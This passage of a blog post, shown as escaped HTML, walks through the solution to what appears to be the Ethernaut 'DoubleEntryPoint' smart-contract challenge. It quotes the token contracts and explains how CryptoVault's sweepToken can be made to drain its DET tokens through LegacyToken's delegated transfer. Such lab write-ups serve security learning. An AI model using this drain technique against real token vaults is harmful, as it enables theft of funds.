&lt;&#x2F;span&gt;&lt;span&gt;contract LegacyToken is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;LegacyToken&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;LGT&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Ownable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)) { &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; added address(0) to escape compiler errors
&lt;&#x2F;span&gt;&lt;span&gt;    DelegateERC20 public delegate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegateToNewContract&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;DelegateERC20 newContract&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        delegate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;newContract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 value&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public override returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(delegate) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;delegate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegateTransfer&lt;&#x2F;span&gt;&lt;span&gt;(to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract DoubleEntryPoint is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DoubleEntryPointToken&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DET&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;DelegateERC20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Ownable &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)) { &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; added address(0) to escape compiler errors
&lt;&#x2F;span&gt;&lt;span&gt;    address public cryptoVault&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public delegatedFrom&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    Forta public forta&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address legacyToken&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address vaultAddress&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address fortaAddress&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address playerAddress) {
&lt;&#x2F;span&gt;&lt;span&gt;        delegatedFrom &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;legacyToken&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        forta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Forta&lt;&#x2F;span&gt;&lt;span&gt;(fortaAddress)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;playerAddress&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        cryptoVault &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;vaultAddress&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(cryptoVault&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;onlyDelegateFrom&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;delegatedFrom&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Not legacy contract&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fortaNotify&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        address detectionBot &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(forta&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;usersDetectionBots&lt;&#x2F;span&gt;&lt;span&gt;(player))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Cache old number of bot alerts
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 previousValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;forta&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;botRaisedAlerts&lt;&#x2F;span&gt;&lt;span&gt;(detectionBot)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Notify Forta
&lt;&#x2F;span&gt;&lt;span&gt;        forta&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;data)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Continue execution
&lt;&#x2F;span&gt;&lt;span&gt;        _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Check if alarms have been raised
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(forta&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;botRaisedAlerts&lt;&#x2F;span&gt;&lt;span&gt;(detectionBot) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;previousValue) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Alert has been triggered, reverting&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegateTransfer&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address origSender
&lt;&#x2F;span&gt;&lt;span&gt;    ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public override onlyDelegateFrom fortaNotify returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_transfer&lt;&#x2F;span&gt;&lt;span&gt;(origSender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Drain the underlying token balance of CryptoVault and Write a detection bot to catch this bug.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;There are four contract in total CryptoVault, DoubleEntryPoint, LegacyToken and Forta.&lt;&#x2F;li&gt;
&lt;li&gt;CryptoVault implemented &lt;code&gt;sweepToken()&lt;&#x2F;code&gt; function which allows us to sweep all the tokens from the CryptoVault except the &lt;code&gt;underlying&lt;&#x2F;code&gt; tokens.&lt;&#x2F;li&gt;
&lt;li&gt;The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.&lt;&#x2F;li&gt;
&lt;li&gt;LegacyToken is simple ERC20 token which is already deployed and minted 100 tokens for the CryptoVault.&lt;&#x2F;li&gt;
&lt;li&gt;LegacyToken also have function &lt;code&gt;transfer()&lt;&#x2F;code&gt; which is where the catch is,&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 value&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public override returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(delegate) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;delegate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegateTransfer&lt;&#x2F;span&gt;&lt;span&gt;(to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;6&quot;&gt;
&lt;li&gt;I checked that the &lt;code&gt;delegate&lt;&#x2F;code&gt; is the address of the DoubleEntryPoint Token. And it is assigned to delegate in LegacyToken contract.&lt;&#x2F;li&gt;
&lt;li&gt;So, whenever we call the &lt;code&gt;transfer()&lt;&#x2F;code&gt; in LegacyToken it will call the &lt;code&gt;delegate.delegateTransfer(to, value, msg.sender);&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Here the &lt;code&gt;delegate&lt;&#x2F;code&gt; == &lt;code&gt;DET&lt;&#x2F;code&gt; address. Which means the LegacyToken contract is calling the &lt;code&gt;delegateTransfer()&lt;&#x2F;code&gt; function of DoubleEntryPoint contract.&lt;&#x2F;li&gt;
&lt;li&gt;Lets see what this function is doing,&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegateTransfer&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address origSender
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public override onlyDelegateFrom fortaNotify returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_transfer&lt;&#x2F;span&gt;&lt;span&gt;(origSender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;10&quot;&gt;
&lt;li&gt;Its sending the &lt;code&gt;DET&lt;&#x2F;code&gt; tokens to the &lt;code&gt;to&lt;&#x2F;code&gt; address from the &lt;code&gt;origSender&lt;&#x2F;code&gt; of &lt;code&gt;value&lt;&#x2F;code&gt;. Lets see what are these values.&lt;&#x2F;li&gt;
&lt;li&gt;When this function executes it transfers DET tokens of &lt;code&gt;origSender&lt;&#x2F;code&gt; to the &lt;code&gt;to&lt;&#x2F;code&gt; address. CryptoVault holds 100 DET tokens.&lt;&#x2F;li&gt;
&lt;li&gt;So, if the &lt;code&gt;origSender&lt;&#x2F;code&gt; is CryptoVault and the call to &lt;code&gt;delegateTransfer()&lt;&#x2F;code&gt; was made by &lt;code&gt;LegacyToken&lt;&#x2F;code&gt; and no alerts from the &lt;code&gt;fortaNotify&lt;&#x2F;code&gt; will transfer DET tokens from CryptoVault. (Ignore fortaNotify as they are not yet implmented)&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;delegateTransfer()&lt;&#x2F;code&gt; is called by LegacyToken contract from the &lt;code&gt;transfer()&lt;&#x2F;code&gt; function. The &lt;code&gt;origSender&lt;&#x2F;code&gt; is the &lt;code&gt;msg.sender&lt;&#x2F;code&gt; of transfer() function in LegacyToken.&lt;&#x2F;li&gt;
&lt;li&gt;So, we have to make the CryptoVault to call the &lt;code&gt;transfer()&lt;&#x2F;code&gt; function of the LegacyToken.&lt;&#x2F;li&gt;
&lt;li&gt;We see the one &lt;code&gt;transfer()&lt;&#x2F;code&gt; call is made on the &lt;code&gt;token&lt;&#x2F;code&gt; by CryptoVault inside &lt;code&gt;sweepToken()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
